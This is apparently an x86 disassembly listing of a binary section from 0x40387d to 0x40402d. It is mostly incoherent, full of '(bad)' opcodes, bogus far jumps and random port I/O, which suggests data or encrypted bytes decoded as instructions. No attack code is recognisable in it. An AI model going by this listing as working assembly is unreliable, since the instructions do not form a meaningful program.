  40387d:	rcr    BYTE PTR [esi-0x4f3f07f2],1
  403883:	mov    esp,0x7d59d8ff
  403888:	mov    WORD PTR [esi],gs
  40388a:	mov    ch,0x9d
  40388c:	mov    edx,0xdc46326b
  403891:	sbb    bl,BYTE PTR [edx-0x5d7f0754]
  403897:	int3   
  403898:	fst    DWORD PTR [edx+0xbcd0ecb]
  40389e:	ja     0x403884
  4038a0:	mov    cl,0x50
  4038a2:	test   BYTE PTR [eax],0xb7
  4038a5:	ja     0x4038ea
  4038a7:	retf   
  4038a8:	push   edi
  4038a9:	jge    0x403929
  4038ab:	xchg   edi,eax
  4038ac:	enter  0x3392,0x36
  4038b0:	cmp    ebp,DWORD PTR [ebx+0x10114809]
  4038b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038b7:	add    al,0xbd
  4038b9:	xchg   edi,eax
  4038ba:	sbb    DWORD PTR [esi],esi
  4038bc:	in     al,dx
  4038bd:	in     eax,dx
  4038be:	add    eax,esp
  4038c0:	mov    al,BYTE PTR [eax+ecx*1]
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0xf2d405f3
  4038d5:	or     al,0xde
  4038d7:	mov    esi,0x78781d14
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x403940
  4038e1:	inc    ebp
  4038e2:	test   eax,0x5a22ffdc
  4038e7:	inc    esi
  4038e8:	dec    ebp
  4038e9:	cmp    DWORD PTR [eax],eax
  4038eb:	mov    dh,0x57
  4038ed:	mov    bl,cl
  4038ef:	inc    edx
  4038f0:	or     al,0x96
  4038f2:	lods   eax,DWORD PTR ds:[esi]
  4038f3:	std    
  4038f4:	push   esp
  4038f5:	sbb    BYTE PTR [edi+0x25],dl
  4038f8:	outs   dx,BYTE PTR ds:[esi]
  4038f9:	xchg   DWORD PTR [edx+0x33c2b0ce],edi
  4038ff:	mov    esi,ss
  403901:	pop    edi
  403902:	std    
  403903:	xor    BYTE PTR [edx+0x31f0fae0],0xa6
  40390a:	and    eax,0xce478269
  403910:	xor    DWORD PTR ds:0xa3bebc62,ebp
  403916:	xchg   edx,eax
  403917:	(bad)  
  403918:	mov    esi,0x204b8ec1
  40391d:	pop    es
  40391e:	pop    ds
  40391f:	nop
  403920:	cli    
  403921:	std    
  403922:	fdivr  st,st(0)
  403924:	std    
  403925:	mov    cl,0x16
  403927:	imul   esi,DWORD PTR ds:0xa24f36de,0xc13904ab
  403931:	lods   al,BYTE PTR ds:[esi]
  403932:	mov    dl,dl
  403934:	adc    dl,cl
  403936:	push   es
  403937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403938:	mov    esi,0xbd6e41f6
  40393d:	cmp    BYTE PTR [eax+0x2c4e667a],dl
  403943:	cli    
  403944:	aad    0xb5
  403946:	xor    BYTE PTR [edi+0x30],bl
  403949:	jecxz  0x4039a3
  40394b:	inc    esp
  40394c:	(bad)  
  40394d:	xor    BYTE PTR [edx+0x77664dec],cl
  403953:	jns    0x4038f1
  403955:	(bad)  
  403956:	jmp    ecx
  403958:	xchg   esp,eax
  403959:	jnp    0x403986
  40395b:	imul   ebp
  40395d:	pusha  
  40395e:	jge    0x4039c9
  403960:	ins    DWORD PTR es:[di],dx
  403962:	repz retf 
  403964:	jmp    0xd3b900c9
  403969:	ret    
  40396a:	and    al,bh
  40396c:	inc    eax
  40396d:	arpl   ax,sp
  40396f:	cmp    edx,DWORD PTR [edi+edx*1]
  403972:	push   ebp
  403973:	pop    ebp
  403974:	(bad)  
  403975:	sub    eax,DWORD PTR [edx-0x2f]
  403978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403979:	sbb    al,0xcc
  40397b:	scas   eax,DWORD PTR es:[edi]
  40397c:	int    0xe1
  40397e:	fwait
  40397f:	mov    ds:0x33dad3c5,al
  403984:	push   eax
  403985:	mov    ebx,0xf5ed62d5
  40398a:	dec    eax
  40398b:	jmp    0x2c493760
  403990:	dec    ecx
  403991:	test   eax,0xddc03ddd
  403996:	scas   eax,DWORD PTR es:[edi]
  403997:	loope  0x403969
  403999:	js     0x403925
  40399b:	(bad)  
  40399c:	sbb    DWORD PTR [eax+0x46bd96f8],eax
  4039a2:	dec    esi
  4039a3:	push   0xa22dca01
  4039a8:	dec    edi
  4039a9:	loop   0x4039a1
  4039ab:	cmp    ebp,edx
  4039ad:	mov    esi,0xe49c7310
  4039b2:	cdq    
  4039b3:	out    dx,eax
  4039b4:	nop    DWORD PTR [esi-0x219dfe52]
  4039bb:	call   0xa68b:0x576deea1
  4039c2:	mov    ebx,0xc6ddd9c6
  4039c7:	pushf  
  4039c8:	arpl   WORD PTR [eax-0x50],dx
  4039cb:	pusha  
  4039cc:	cmp    al,0xaa
  4039ce:	inc    edi
  4039cf:	test   DWORD PTR [ebx+ebp*2],0x3b6b5e9
  4039d6:	or     eax,0xf733c604
  4039db:	pop    esi
  4039dc:	mov    BYTE PTR [edx],dl
  4039de:	sbb    BYTE PTR [ebx-0x7e],ah
  4039e1:	enter  0x4c95,0x9c
  4039e5:	xchg   esi,eax
  4039e6:	add    eax,0x75c5dc1c
  4039eb:	push   ebx
  4039ec:	jmp    0xab21:0xfdc2560b
  4039f3:	sbb    DWORD PTR [edx+0x212f2f49],0x4a8f68d1
  4039fd:	pop    edx
  4039fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ff:	adc    ah,bl
  403a01:	cmp    DWORD PTR [ecx+0x699bb0a6],edx
  403a07:	push   ds
  403a08:	out    0x35,al
  403a0a:	cmp    esi,edx
  403a0c:	mov    dl,0x24
  403a0e:	cli    
  403a0f:	pop    ss
  403a10:	test   al,0x44
  403a12:	in     eax,0x65
  403a14:	push   ss
  403a15:	es addr16 aad 0xd8
  403a19:	sbb    eax,0xc6531e96
  403a1e:	pop    esi
  403a1f:	and    al,0x6f
  403a21:	inc    edx
  403a22:	push   edx
  403a23:	sub    DWORD PTR [ecx+edi*4],edi
  403a26:	lea    esp,[edx+0x3611f2dc]
  403a2c:	lock xor DWORD PTR [edx+edx*1-0xc],ebp
  403a31:	pusha  
  403a32:	add    ch,bl
  403a34:	out    0x46,al
  403a36:	ror    BYTE PTR [ebp-0x50e11f8b],1
  403a3c:	sbb    eax,0xdb808554
  403a41:	jmp    0x81c6:0xaf6f04c9
  403a48:	(bad)  
  403a49:	test   BYTE PTR [ecx],0xb7
  403a4c:	adc    BYTE PTR [edx-0x79a547dd],bh
  403a52:	jmp    0x2feb:0xe75bdfd
  403a59:	and    al,0xc2
  403a5b:	jne    0x403a5f
  403a5d:	sbb    BYTE PTR [ebx],al
  403a5f:	fadd   DWORD PTR [eax+0x21ad6c62]
  403a65:	cwde   
  403a66:	sub    esi,DWORD PTR [ecx]
  403a68:	fcomp  st(3)
  403a6a:	fcom   DWORD PTR [ebx]
  403a6c:	in     eax,dx
  403a6d:	jne    0x403a24
  403a6f:	test   bh,ah
  403a71:	mov    edi,0x7425580f
  403a76:	dec    ebp
  403a77:	dec    ebx
  403a78:	aad    0xbc
  403a7a:	cmp    BYTE PTR [esi],bl
  403a7c:	outs   dx,DWORD PTR ds:[esi]
  403a7d:	fs scas eax,DWORD PTR es:[edi]
  403a7f:	or     al,0xf
  403a81:	retf   0x75aa
  403a84:	xchg   ecx,eax
  403a85:	inc    edx
  403a86:	(bad)  
  403a87:	das    
  403a88:	nop
  403a89:	je     0x403a5d
  403a8b:	xchg   ecx,eax
  403a8c:	mov    eax,ds:0x51d5e080
  403a91:	jp     0x403ad2
  403a93:	jb     0x403a88
  403a95:	add    eax,0xd1566af9
  403a9a:	mov    esp,0xf7de04e5
  403a9f:	add    eax,0xca1ebe2
  403aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa5:	nop
  403aa6:	das    
  403aa7:	sbb    DWORD PTR [esi-0x35],ebp
  403aaa:	rcl    DWORD PTR [ecx+0x67ad361f],cl
  403ab0:	pop    ss
  403ab1:	xchg   DWORD PTR [edx+edx*2-0x5f566a2f],esi
  403ab8:	sar    bl,cl
  403aba:	fs sbb ebx,edi
  403abd:	push   edi
  403abe:	adc    al,0x1f
  403ac0:	stos   DWORD PTR es:[edi],eax
  403ac1:	add    dl,cl
  403ac3:	sub    ebx,DWORD PTR [ebx]
  403ac5:	jle    0x403b14
  403ac7:	dec    edi
  403ac8:	pop    ebx
  403ac9:	cwde   
  403aca:	inc    esi
  403acb:	add    al,0xce
  403acd:	pop    ebx
  403ace:	adc    al,0x26
  403ad0:	pop    edx
  403ad1:	fst    st(2)
  403ad3:	fst    QWORD PTR [esi]
  403ad5:	in     al,0xa1
  403ad7:	mov    DWORD PTR [ebp-0x57],esp
  403ada:	mov    esp,0xcd2a5a9b
  403adf:	mov    bh,0x9b
  403ae1:	dec    esp
  403ae2:	cdq    
  403ae3:	jmp    DWORD PTR [edx-0x7f]
  403ae6:	inc    ebx
  403ae7:	push   ebp
  403ae8:	dec    edi
  403ae9:	ss xchg edx,eax
  403aeb:	pop    es
  403aec:	test   DWORD PTR [edx-0x36aefd57],edi
  403af2:	push   esi
  403af3:	aad    0x18
  403af5:	inc    esp
  403af6:	xchg   DWORD PTR [edi],ebp
  403af8:	ret    
  403af9:	stos   BYTE PTR es:[edi],al
  403afa:	ins    BYTE PTR es:[edi],dx
  403afb:	mov    cl,0xb
  403afd:	mov    ds:0x5c1c6dc,eax
  403b02:	aas    
  403b03:	mov    al,0x10
  403b05:	aaa    
  403b06:	stos   DWORD PTR es:[edi],eax
  403b07:	icebp  
  403b08:	jg     0x403b04
  403b0a:	loopne 0x403b59
  403b0c:	loop   0x403ab3
  403b0e:	es mov bl,BYTE PTR fs:[edi]
  403b12:	imul   esp,DWORD PTR [edx+0x5068e9a7],0xffffffdf
  403b19:	(bad)  
  403b1a:	jns    0x403ada
  403b1c:	mov    al,ds:0x2d3d1a50
  403b21:	jmp    0xd382e418
  403b26:	test   eax,0xb34f3cdc
  403b2b:	xchg   DWORD PTR [ebp+0x72363439],esp
  403b31:	loope  0x403b5b
  403b33:	sbb    BYTE PTR [ebx],0x7e
  403b36:	imul   eax,DWORD PTR [esi-0x75],0x41b634dc
  403b3d:	shl    DWORD PTR [esi-0x6f],cl
  403b40:	sub    al,0x33
  403b42:	pop    es
  403b43:	iret   
  403b44:	sub    al,ah
  403b46:	(bad)  
  403b47:	iret   
  403b48:	jns    0x403bad
  403b4a:	or     ebp,DWORD PTR [esi]
  403b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b4d:	mov    bh,0xe0
  403b4f:	jo     0x403aee
  403b51:	lods   al,BYTE PTR ds:[esi]
  403b52:	in     al,0x9f
  403b54:	(bad)  
  403b55:	std    
  403b56:	out    0x1d,al
  403b58:	enter  0x647,0x71
  403b5c:	dec    esp
  403b5d:	mov    bl,0xbc
  403b5f:	cdq    
  403b60:	pop    esp
  403b61:	cld    
  403b62:	add    al,0x3b
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	test   al,0xf8
  403b81:	jo     0x403b4f
  403b83:	call   0x787e:0xfe787823
  403b8a:	js     0x403b50
  403b8c:	xchg   ebp,eax
  403b8d:	lods   eax,DWORD PTR ds:[esi]
  403b8e:	(bad)  
  403b90:	fwait
  403b91:	cmc    
  403b92:	int3   
  403b93:	cmp    eax,0x22d662ce
  403b98:	adc    dl,BYTE PTR [edi+0x5e]
  403b9b:	sub    al,0xb
  403b9d:	inc    edi
  403b9e:	jg     0x403c07
  403ba0:	ror    BYTE PTR [edi],1
  403ba2:	push   es
  403ba3:	in     al,dx
  403ba4:	xor    al,0xc5
  403ba6:	retf   
  403ba7:	(bad)  
  403ba8:	xor    al,0x7e
  403baa:	addr16 adc al,0xc8
  403bad:	stc    
  403bae:	into   
  403baf:	mov    BYTE PTR [ecx+ebx*1],dh
  403bb2:	inc    eax
  403bb3:	xor    DWORD PTR [esi-0x6aea4c1a],edi
  403bb9:	mov    esp,0xd7dbbac7
  403bbe:	push   edx
  403bbf:	cwde   
  403bc0:	push   edi
  403bc1:	loopne 0x403bb0
  403bc3:	dec    ebx
  403bc4:	hlt    
  403bc5:	adc    dl,BYTE PTR [edx]
  403bc7:	fcmovb st,st(2)
  403bc9:	pop    esp
  403bca:	test   al,0x37
  403bcc:	leave  
  403bcd:	jle    0x403beb
  403bcf:	pop    ds
  403bd0:	mov    bh,0xaa
  403bd2:	pop    esp
  403bd3:	hlt    
  403bd4:	inc    edx
  403bd5:	scas   al,BYTE PTR es:[edi]
  403bd6:	mov    ah,bh
  403bd8:	iret   
  403bd9:	lahf   
  403bda:	adc    eax,DWORD PTR [ecx]
  403bdc:	adc    eax,0xf89e57d4
  403be1:	sar    BYTE PTR [ebp-0x4c],1
  403be4:	stc    
  403be5:	pop    esi
  403be6:	or     dl,BYTE PTR [esi]
  403be8:	lea    esi,[ebx+0x69925dd0]
  403bee:	arpl   WORD PTR [edi+0x4a],cx
  403bf1:	dec    edx
  403bf2:	mov    dl,BYTE PTR [esi]
  403bf4:	(bad)  
  403bf5:	jmp    0x955c1043
  403bfa:	clc    
  403bfb:	sahf   
  403bfc:	jnp    0x403bfa
  403bfe:	jae    0x403c5e
  403c00:	inc    eax
  403c01:	mov    ebx,0x9836f40c
  403c06:	(bad)  
  403c07:	mov    ebx,0xb5ac9982
  403c0c:	or     al,0xba
  403c0e:	xchg   esi,eax
  403c0f:	fisttp DWORD PTR [ecx]
  403c12:	add    BYTE PTR [ecx-0x69],dl
  403c15:	sbb    eax,0x3a42f53a
  403c1a:	leave  
  403c1b:	mov    al,ds:0x30a08335
  403c20:	in     al,0xd
  403c22:	pop    edx
  403c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c24:	outs   dx,BYTE PTR ds:[esi]
  403c25:	hlt    
  403c26:	or     dl,BYTE PTR [ecx-0x1d]
  403c29:	enter  0xd5e6,0x6e
  403c2d:	or     al,0xd1
  403c2f:	mov    BYTE PTR [eax-0x6568a556],bh
  403c35:	jmp    0x6ab:0xc9b460ab
  403c3c:	push   esi
  403c3d:	cmp    dl,BYTE PTR [esi]
  403c3f:	jnp    0x403bc7
  403c41:	pop    ebx
  403c42:	call   0xf15:0x849d1a92
  403c49:	pop    esp
  403c4a:	inc    ecx
  403c4b:	jmp    0xb2aa:0xfa456d3e
  403c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c53:	or     DWORD PTR [ecx],esp
  403c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c56:	aas    
  403c57:	or     BYTE PTR [eax+0x5],ch
  403c5a:	das    
  403c5b:	rol    DWORD PTR [ebp-0x5170ab23],cl
  403c61:	mov    edi,0xb2aab10c
  403c66:	xchg   edi,eax
  403c67:	stos   BYTE PTR es:[edi],al
  403c68:	scas   eax,DWORD PTR es:[edi]
  403c69:	imul   esi,esi,0x20
  403c6c:	call   0xe1a0:0x23bd82aa
  403c73:	mov    ebp,0xc708025
  403c78:	adc    ah,BYTE PTR [ebp-0xa]
  403c7b:	aas    
  403c7c:	call   0x7a23:0x371c018a
  403c83:	aam    0x1d
  403c85:	popa   
  403c86:	mov    esi,0x6c18fa70
  403c8b:	and    esp,ebp
  403c8d:	mov    cl,bl
  403c8f:	lods   eax,DWORD PTR ds:[esi]
  403c90:	jle    0x403c97
  403c92:	cwde   
  403c93:	inc    esi
  403c94:	(bad)  
  403c95:	fcomp  QWORD PTR [ebp-0x1bf471fe]
  403c9b:	adc    DWORD PTR [edx-0x7],esi
  403c9e:	fld    DWORD PTR [edx+0x33]
  403ca1:	push   ss
  403ca2:	outs   dx,DWORD PTR ds:[esi]
  403ca3:	mov    bh,0x54
  403ca5:	mov    esi,0xa7af6914
  403caa:	jae    0x403c90
  403cac:	or     DWORD PTR [eax+0x56d60c00],0x7d
  403cb3:	js     0x403c5e
  403cb5:	dec    ebp
  403cb6:	and    eax,0xffe2cf5
  403cbb:	sub    eax,0x5c79c0bf
  403cc0:	sbb    dh,BYTE PTR [edx-0x768b0110]
  403cc6:	mov    ebx,DWORD PTR [ebx]
  403cc8:	sahf   
  403cc9:	jl     0x403cc7
  403ccb:	ss inc ebp
  403ccd:	mov    ss,WORD PTR [edi+0x57225735]
  403cd3:	popa   
  403cd4:	cdq    
  403cd5:	and    bl,BYTE PTR [eax-0x6e]
  403cd8:	xor    cl,BYTE PTR [esi-0x4c75eafc]
  403cde:	into   
  403cdf:	clc    
  403ce0:	test   eax,0x98e38032
  403ce5:	lahf   
  403ce6:	dec    ebx
  403ce7:	xor    BYTE PTR ds:0x9ef82b44,0xaf
  403cee:	jmp    0xd25fc616
  403cf3:	mov    bh,0x42
  403cf5:	and    al,0x8f
  403cf7:	sti    
  403cf8:	jl     0x403d68
  403cfa:	adc    eax,0xd374b4b1
  403cff:	imul   esi,DWORD PTR [ebx+eax*2+0x61],0xffffffc1
  403d04:	add    eax,0xb9d3fac7
  403d09:	inc    edx
  403d0a:	mov    al,ds:0xccdaa7d7
  403d0f:	lock mov esi,0x621e4601
  403d15:	mov    ds:0xc2abc3c8,al
  403d1a:	xchg   BYTE PTR [esi],dh
  403d1c:	bound  eax,QWORD PTR [eax-0x59]
  403d1f:	enter  0xbbe8,0xbf
  403d23:	mov    al,0x78
  403d25:	adc    bl,BYTE PTR [eax-0x73900949]
  403d2b:	sub    eax,0x6d742c19
  403d30:	les    edi,FWORD PTR [ebx]
  403d32:	fucomp st(2)
  403d34:	dec    esi
  403d35:	push   0x27069947
  403d3a:	bound  ebx,QWORD PTR [eax+eax*8]
  403d3d:	in     al,0x1e
  403d3f:	shl    DWORD PTR [eax],1
  403d41:	inc    DWORD PTR [esi+0x37e292ce]
  403d47:	inc    DWORD PTR [edi]
  403d49:	adc    BYTE PTR [ecx+ebp*1],dl
  403d4c:	mov    ebp,0x15f61106
  403d51:	es enter 0xbe1f,0x80
  403d56:	in     eax,0x1a
  403d58:	lods   eax,DWORD PTR ds:[esi]
  403d59:	sbb    BYTE PTR [ecx-0x78],0x7c
  403d5d:	dec    ebp
  403d5e:	jnp    0x403dc2
  403d60:	sub    al,0xe
  403d62:	add    esp,ebx
  403d64:	cmp    bl,dh
  403d66:	fisub  DWORD PTR [ecx+0x6f8465eb]
  403d6c:	jae    0x403d37
  403d6e:	fst    DWORD PTR gs:[ebx]
  403d71:	jmp    0x403d34
  403d73:	lods   al,BYTE PTR ds:[esi]
  403d74:	sbb    al,0x6c
  403d76:	cmp    edi,DWORD PTR [eax+edx*4-0x7fa18d7a]
  403d7d:	ss int 0x64
  403d80:	lods   eax,DWORD PTR ds:[esi]
  403d81:	popa   
  403d82:	adc    bl,ch
  403d84:	lods   eax,DWORD PTR ds:[esi]
  403d85:	xlat   BYTE PTR ds:[ebx]
  403d86:	clc    
  403d87:	pop    esp
  403d88:	aaa    
  403d89:	jmp    0x1e85:0x152b70e8
  403d90:	pop    ss
  403d91:	(bad)
  403d95:	xchg   DWORD PTR [ebx+0xa],edi
  403d98:	shl    al,1
  403d9a:	fidivr WORD PTR [eax+0x139f34af]
  403da0:	fsubr  QWORD PTR [edi+0x8]
  403da3:	mov    ds:0x11c2f268,al
  403da8:	mov    dh,0xb6
  403daa:	fstp   QWORD PTR [esi+ecx*2+0x55]
  403dae:	dec    ecx
  403daf:	sti    
  403db0:	pusha  
  403db1:	inc    edi
  403db2:	mov    ch,0xd3
  403db4:	push   ecx
  403db5:	fbld   TBYTE PTR [esi+0x37440a70]
  403dbb:	and    eax,0xb08435cf
  403dc0:	inc    esp
  403dc1:	push   edx
  403dc2:	jns    0x403de0
  403dc4:	imul   ecx,DWORD PTR [ebx-0x15f305f8],0xffffffa7
  403dcb:	mov    ds:0xa63e4672,al
  403dd0:	ficom  WORD PTR [ebp+0x1440384c]
  403dd6:	xchg   BYTE PTR [ecx+0x32578d31],ah
  403ddc:	fcom   DWORD PTR [ebp+0x15b7072c]
  403de2:	call   0x4b94:0x9584309d
  403de9:	fs scas al,BYTE PTR es:[edi]
  403deb:	inc    esi
  403dec:	add    BYTE PTR [edi-0x29],cl
  403def:	cmc    
  403df0:	jne    0x403e31
  403df2:	sbb    DWORD PTR [ebx],edi
  403df4:	mov    dl,0x70
  403df6:	jo     0x403e60
  403df8:	nop
  403df9:	outs   dx,BYTE PTR ds:[esi]
  403dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dfb:	fs cdq 
  403dfd:	mov    eax,ds:0xca7e9b5b
  403e02:	xor    DWORD PTR [ebp+edi*1-0x28],edi
  403e06:	outs   dx,DWORD PTR ds:[esi]
  403e07:	mov    BYTE PTR [edx+ecx*8+0x23],bl
  403e0b:	push   es
  403e0c:	pop    eax
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xe3dd8593
  403e30:	inc    ebx
  403e31:	cwde   
  403e32:	sbb    bl,BYTE PTR [eax]
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403de3
  403e3c:	out    0xef,eax
  403e3e:	lods   al,BYTE PTR ds:[esi]
  403e3f:	push   es
  403e40:	mov    esp,0x394786fb
  403e45:	xchg   esi,eax
  403e46:	and    al,0x86
  403e48:	ins    BYTE PTR es:[edi],dx
  403e49:	data16 jecxz 0x403dd4
  403e4c:	sub    al,0xe2
  403e4e:	mov    cs,WORD PTR [ebp-0x36]
  403e51:	ja     0x403e74
  403e53:	fcomp  QWORD PTR ds:[edi]
  403e56:	mov    bl,BYTE PTR [edi]
  403e58:	hlt    
  403e59:	push   cs
  403e5a:	cmp    bl,BYTE PTR [eax+0x5d]
  403e5d:	(bad)  
  403e5e:	shl    dh,0x4f
  403e61:	js     0x403e15
  403e63:	iret   
  403e64:	xchg   ebx,eax
  403e65:	sub    bl,BYTE PTR [ebp+edi*8+0x6b]
  403e69:	sbb    dl,BYTE PTR [ebp+0x296e09e3]
  403e6f:	pop    esp
  403e70:	(bad)  
  403e71:	dec    esp
  403e72:	jns    0x403e4e
  403e74:	mov    ecx,0xd066562e
  403e79:	ins    DWORD PTR es:[edi],dx
  403e7a:	or     DWORD PTR [edx+0x1e],ebx
  403e7d:	jae    0x403e3c
  403e7f:	idiv   BYTE PTR [ebp-0x34]
  403e82:	ret    0xd421
  403e85:	loope  0x403e21
  403e87:	adc    esp,ecx
  403e89:	lds    edi,FWORD PTR [esp+eax*4+0x5b015f8d]
  403e90:	rol    DWORD PTR [esi],0xab
  403e93:	dec    eax
  403e94:	jae    0x403e44
  403e96:	xor    esi,esi
  403e98:	test   al,0xf8
  403e9a:	xor    DWORD PTR [esi-0x4a960944],ebp
  403ea0:	xchg   DWORD PTR [ecx-0x263d0677],eax
  403ea6:	push   edi
  403ea7:	not    BYTE PTR [ebp-0x3d]
  403eaa:	dec    edi
  403eab:	or     esp,DWORD PTR [eax-0x24]
  403eae:	shl    BYTE PTR [edi-0x63],1
  403eb1:	and    ebx,ebx
  403eb3:	cdq    
  403eb4:	or     eax,0x1fbeded6
  403eb9:	les    edx,FWORD PTR [ecx-0x6a8afd34]
  403ebf:	mov    BYTE PTR [ebx-0x56dcf15b],dh
  403ec5:	adc    al,0x89
  403ec7:	lds    eax,FWORD PTR [edx+0x12]
  403eca:	pop    ecx
  403ecb:	dec    ecx
  403ecc:	adc    BYTE PTR [ecx],bh
  403ece:	aam    0xae
  403ed0:	retf   0xa602
  403ed3:	push   esp
  403ed4:	into   
  403ed5:	jmp    0x403eea
  403ed7:	and    al,0x7d
  403ed9:	add    eax,0x5ba7bf34
  403ede:	xor    ebx,DWORD PTR [edi+0x27]
  403ee1:	js     0x403e96
  403ee3:	pop    ebp
  403ee4:	cdq    
  403ee5:	clc    
  403ee6:	mov    ds:0xe8f9ee4b,al
  403eeb:	mov    edx,0x11684f37
  403ef0:	lea    edx,[eax]
  403ef2:	and    dl,BYTE PTR [ecx]
  403ef4:	push   edx
  403ef5:	xor    DWORD PTR [ebx-0x5a84bb4d],0x60
  403efc:	daa    
  403efd:	mov    dh,0x51
  403eff:	cmovp  edi,DWORD PTR [ecx-0x59]
  403f03:	(bad)  
  403f05:	mov    dl,0xdf
  403f07:	pop    edx
  403f08:	cmp    BYTE PTR [ecx],dl
  403f0a:	hlt    
  403f0b:	dec    edi
  403f0c:	rcl    ebx,0x53
  403f0f:	jo     0x403ecf
  403f11:	mov    DWORD PTR [edi+0x14bca030],0x226d3b44
  403f1b:	shl    DWORD PTR [eax+0x5],cl
  403f1e:	shl    DWORD PTR [esi+0x54cc8f43],cl
  403f24:	pop    edi
  403f25:	cli    
  403f26:	cmc    
  403f27:	inc    ebp
  403f28:	retf   
  403f29:	shl    DWORD PTR [ebp+ebx*2+0x29],0x88
  403f2e:	ret    0x9c73
  403f31:	stc    
  403f32:	sub    al,0xc3
  403f34:	ds xor eax,0xc84848a7
  403f3a:	dec    ebx
  403f3b:	xor    DWORD PTR [ecx],esi
  403f3d:	add    BYTE PTR [edi+0x312d9ad4],ah
  403f43:	lods   al,BYTE PTR ds:[esi]
  403f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f45:	pmaxub mm2,mm4
  403f48:	mov    esp,0xd3bd2353
  403f4d:	cmp    eax,DWORD PTR [esi+0x6d]
  403f50:	sub    al,BYTE PTR [esi+ecx*4+0x4b]
  403f54:	arpl   WORD PTR [esp+esi*2],ax
  403f57:	push   cs
  403f58:	mov    cl,0xe9
  403f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f5b:	dec    eax
  403f5c:	into   
  403f5d:	and    eax,0x88f9e24f
  403f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f64:	rcr    DWORD PTR [ebp+0x1996f5b9],1
  403f6a:	gs ins BYTE PTR es:[edi],dx
  403f6c:	inc    esp
  403f6d:	fmul   QWORD PTR [esi+eiz*1]
  403f70:	loope  0x403fee
  403f72:	test   ah,cl
  403f74:	add    BYTE PTR [edi-0x5a8b807c],ch
  403f7a:	push   cs
  403f7b:	cmp    al,0xb3
  403f7d:	je     0x403fcb
  403f7f:	and    ebp,DWORD PTR [ebx]
  403f81:	push   0x29
  403f83:	fs (bad) 
  403f86:	in     al,0x1a
  403f88:	lds    edi,FWORD PTR [edx+ebx*1]
  403f8b:	fisttp QWORD PTR [edi+0x597fe8a6]
  403f91:	add    al,0x2e
  403f93:	dec    eax
  403f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f95:	or     DWORD PTR [eax+0x4a],0x74
  403f99:	mov    bh,0x30
  403f9b:	les    ecx,FWORD PTR ds:[ebp+0x65]
  403f9f:	pop    ecx
  403fa0:	push   0xcfb7e648
  403fa5:	mov    dl,0x3
  403fa7:	out    0xe7,al
  403fa9:	pop    esi
  403faa:	add    bl,BYTE PTR [ebx+0x45]
  403fad:	add    DWORD PTR [esi],ebp
  403faf:	xchg   ecx,eax
  403fb0:	pop    ecx
  403fb1:	cmp    ah,BYTE PTR [ebp+0x21483fa6]
  403fb7:	and    bh,BYTE PTR [edi]
  403fb9:	arpl   di,sp
  403fbb:	xchg   ecx,eax
  403fbc:	or     cl,BYTE PTR [edi+0x27]
  403fbf:	mov    esp,0xa8620b82
  403fc4:	outs   dx,BYTE PTR ds:[esi]
  403fc5:	adc    DWORD PTR [edi-0xb7f8dc4],edx
  403fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fcc:	imul   esp,DWORD PTR [ebx],0x40
  403fcf:	pop    ebp
  403fd0:	pop    esi
  403fd1:	xor    esp,DWORD PTR [ebx+0x34262dc3]
  403fd7:	cmc    
  403fd8:	xor    eax,0x53953495
  403fdd:	rol    BYTE PTR [esi+0x53],1
  403fe0:	jbe    0x404037
  403fe2:	inc    esi
  403fe3:	sub    DWORD PTR ds:0xf626e287,edi
  403fe9:	and    esp,DWORD PTR [esi-0x2104098]
  403fef:	mov    bl,0xfe
  403ff1:	jno    0x404021
  403ff3:	je     0x40402b
  403ff5:	sti    
  403ff6:	into   
  403ff7:	push   ecx
  403ff8:	not    BYTE PTR [ebx-0x76]
  403ffb:	xor    cl,BYTE PTR [edx]
  403ffd:	jle    0x404058
  403fff:	fsub   QWORD PTR [edi-0x53]
  404002:	inc    ecx
  404003:	xchg   esp,eax
  404004:	cmp    DWORD PTR [edi],0xd
  404007:	push   esi
  404008:	inc    ebp
  404009:	out    dx,al
  40400a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40400b:	mov    edx,0xa231f0a6
  404010:	stos   BYTE PTR es:[edi],al
  404011:	in     eax,dx
  404012:	pop    es
  404013:	xchg   edx,eax
  404014:	xor    BYTE PTR [ecx-0x8b79d1b],cl
  40401a:	add    eax,DWORD PTR [edi-0x35ecfee5]
  404020:	ss mov ecx,0xea077da9
  404026:	xor    ah,dh
  404028:	jecxz  0x403feb
  40402a:	pusha  
  40402b:	fcmovnb st,st(7)
  40402d:	imul   esp,DWORD PTR [ecx],0x86fdd2fd
